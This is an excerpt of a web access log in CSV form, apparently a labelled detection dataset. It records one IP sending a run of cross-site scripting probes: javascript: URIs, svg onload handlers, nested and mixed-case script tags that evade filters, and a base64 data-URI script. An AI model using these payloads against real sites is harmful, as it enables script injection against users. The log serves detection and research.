+398,192.108.116.88,18/Dec/2017,17,54,59,GET,datalab,%22;alert%28%27RVRSH3LL_XSS%29//,200,1040,,1
+399,192.108.116.88,18/Dec/2017,17,55,00,GET,datalab,%22;alert%28%27RVRSH3LL_XSS%29//,200,945,,1
+400,192.108.116.88,18/Dec/2017,17,55,01,GET,datalab,%22;alert%28%27RVRSH3LL_XSS%29//,200,34463,,1
+401,192.108.116.88,18/Dec/2017,17,55,03,POST,datalab,%22;alert%28%27RVRSH3LL_XSS%29//,200,1073,,1
+402,192.108.116.88,18/Dec/2017,17,55,04,GET,datalab,%22;alert%28%27RVRSH3LL_XSS%29//,304,-,,1
+403,192.108.116.88,18/Dec/2017,17,55,04,GET,datalab,%22;alert%28%27RVRSH3LL_XSS%29//,304,-,,1
+404,192.108.116.88,18/Dec/2017,17,55,26,GET,datalab,javascript:alert%281%29;,200,1040,,1
+405,192.108.116.88,18/Dec/2017,17,55,27,GET,datalab,javascript:alert%281%29;,200,945,,1
+406,192.108.116.88,18/Dec/2017,17,55,27,GET,datalab,javascript:alert%281%29;,200,34463,,1
+407,192.108.116.88,18/Dec/2017,17,55,31,POST,datalab,javascript:alert%281%29;,200,1073,,1
+408,192.108.116.88,18/Dec/2017,17,55,31,GET,datalab,javascript:alert%281%29;,304,-,,1
+409,192.108.116.88,18/Dec/2017,17,55,31,GET,datalab,javascript:alert%281%29;,304,-,,1
+410,192.108.116.88,18/Dec/2017,17,55,55,GET,datalab,<w contenteditable id=x onfocus=alert()>,200,1040,,1
+411,192.108.116.88,18/Dec/2017,17,55,55,GET,datalab,<w contenteditable id=x onfocus=alert()>,200,945,,1
+412,192.108.116.88,18/Dec/2017,17,55,56,GET,datalab,<w contenteditable id=x onfocus=alert()>,200,34463,,1
+413,192.108.116.88,18/Dec/2017,17,55,58,POST,datalab,<w contenteditable id=x onfocus=alert()>,200,1073,,1
+414,192.108.116.88,18/Dec/2017,17,55,58,GET,datalab,<w contenteditable id=x onfocus=alert()>,304,-,,1
+415,192.108.116.88,18/Dec/2017,17,55,58,GET,datalab,<w contenteditable id=x onfocus=alert()>,304,-,,1
+416,192.108.116.88,18/Dec/2017,17,56,18,GET,datalab,"alert;pg(XSS"")",200,1040,1,1
+417,192.108.116.88,18/Dec/2017,17,56,18,GET,datalab,"alert;pg(XSS"")",200,945,1,1
+418,192.108.116.88,18/Dec/2017,17,56,19,GET,datalab,"alert;pg(XSS"")",200,34463,1,1
+419,192.108.116.88,18/Dec/2017,17,56,22,POST,datalab,"alert;pg(XSS"")",200,1073,595,1
+420,192.108.116.88,18/Dec/2017,17,56,23,GET,datalab,"alert;pg(XSS"")",304,-,0,1
+421,192.108.116.88,18/Dec/2017,17,56,23,GET,datalab,"alert;pg(XSS"")",304,-,6,1
+422,192.108.116.88,18/Dec/2017,17,56,40,GET,datalab,<svg/onload=%26%23097lert%26lpar;1337)>,200,1040,,1
+423,192.108.116.88,18/Dec/2017,17,56,40,GET,datalab,<svg/onload=%26%23097lert%26lpar;1337)>,200,945,,1
+424,192.108.116.88,18/Dec/2017,17,56,42,GET,datalab,<svg/onload=%26%23097lert%26lpar;1337)>,200,34463,,1
+425,192.108.116.88,18/Dec/2017,17,56,45,POST,datalab,<svg/onload=%26%23097lert%26lpar;1337)>,200,1073,,1
+426,192.108.116.88,18/Dec/2017,17,56,45,GET,datalab,<svg/onload=%26%23097lert%26lpar;1337)>,304,-,,1
+427,192.108.116.88,18/Dec/2017,17,56,46,GET,datalab,<svg/onload=%26%23097lert%26lpar;1337)>,304,-,,1
+428,192.108.116.88,18/Dec/2017,17,57,02,GET,datalab,<script>for((i)in(self))eval(i)(1)</script>,200,1040,,1
+429,192.108.116.88,18/Dec/2017,17,57,02,GET,datalab,<script>for((i)in(self))eval(i)(1)</script>,200,945,,1
+430,192.108.116.88,18/Dec/2017,17,57,03,GET,datalab,<script>for((i)in(self))eval(i)(1)</script>,200,34463,,1
+431,192.108.116.88,18/Dec/2017,17,57,06,POST,datalab,<script>for((i)in(self))eval(i)(1)</script>,200,1073,,1
+432,192.108.116.88,18/Dec/2017,17,57,06,GET,datalab,<script>for((i)in(self))eval(i)(1)</script>,304,-,,1
+433,192.108.116.88,18/Dec/2017,17,57,06,GET,datalab,<script>for((i)in(self))eval(i)(1)</script>,304,-,,1
+434,192.108.116.88,18/Dec/2017,17,57,21,GET,datalab,<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>,200,1040,,1
+435,192.108.116.88,18/Dec/2017,17,57,21,GET,datalab,<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>,200,945,,1
+436,192.108.116.88,18/Dec/2017,17,57,22,GET,datalab,<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>,200,34463,,1
+437,192.108.116.88,18/Dec/2017,17,57,23,POST,datalab,<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>,200,1073,,1
+438,192.108.116.88,18/Dec/2017,17,57,23,GET,datalab,<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>,304,-,,1
+439,192.108.116.88,18/Dec/2017,17,57,23,GET,datalab,<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>,304,-,,1
+440,192.108.116.88,18/Dec/2017,17,57,39,GET,datalab,<sCR<script>iPt>alert(1)</SCr</script>IPt>,200,1040,,1
+441,192.108.116.88,18/Dec/2017,17,57,39,GET,datalab,<sCR<script>iPt>alert(1)</SCr</script>IPt>,200,945,,1
+442,192.108.116.88,18/Dec/2017,17,57,39,GET,datalab,<sCR<script>iPt>alert(1)</SCr</script>IPt>,200,34463,,1
+443,192.108.116.88,18/Dec/2017,17,57,40,POST,datalab,<sCR<script>iPt>alert(1)</SCr</script>IPt>,200,1073,,1
+444,192.108.116.88,18/Dec/2017,17,57,40,GET,datalab,<sCR<script>iPt>alert(1)</SCr</script>IPt>,304,-,,1
+445,192.108.116.88,18/Dec/2017,17,57,40,GET,datalab,<sCR<script>iPt>alert(1)</SCr</script>IPt>,304,-,,1
+446,192.108.116.88,18/Dec/2017,17,57,59,GET,datalab,"<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a",200,1040,0,1
+447,192.108.116.88,18/Dec/2017,17,58,01,GET,datalab,"<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a",200,945,1,1
+448,192.108.116.88,18/Dec/2017,17,58,01,GET,datalab,"<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a",200,34463,7,1
+449,192.108.116.88,18/Dec/2017,17,58,04,POST,datalab,"<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a",200,1073,648,1
+450,192.108.116.88,18/Dec/2017,17,58,05,GET,datalab,"<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a",304,-,0,1
+451,192.108.116.88,18/Dec/2017,17,58,05,GET,datalab,"<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a",304,-,8,1
